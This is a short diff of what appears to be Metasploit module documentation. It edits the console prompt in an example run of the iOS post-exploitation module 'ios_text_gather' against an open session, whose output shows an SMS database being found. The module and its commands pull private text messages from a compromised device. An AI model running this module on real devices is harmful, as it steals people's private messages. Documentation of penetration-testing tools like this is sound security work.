@@ -17,10 +17,10 @@
 
   ```
 
-  msf5 > use post/apple_ios/gather/ios_text_gather
-  msf5 post(apple_ios/gather/ios_text_gather) > set session 1
+  msf > use post/apple_ios/gather/ios_text_gather
+  msf post(apple_ios/gather/ios_text_gather) > set session 1
   session => 1
-  msf5 post(apple_ios/gather/ios_text_gather) > run
+  msf post(apple_ios/gather/ios_text_gather) > run
 
   [!] SESSION may not be compatible with this module.
   [+] sms.db file found
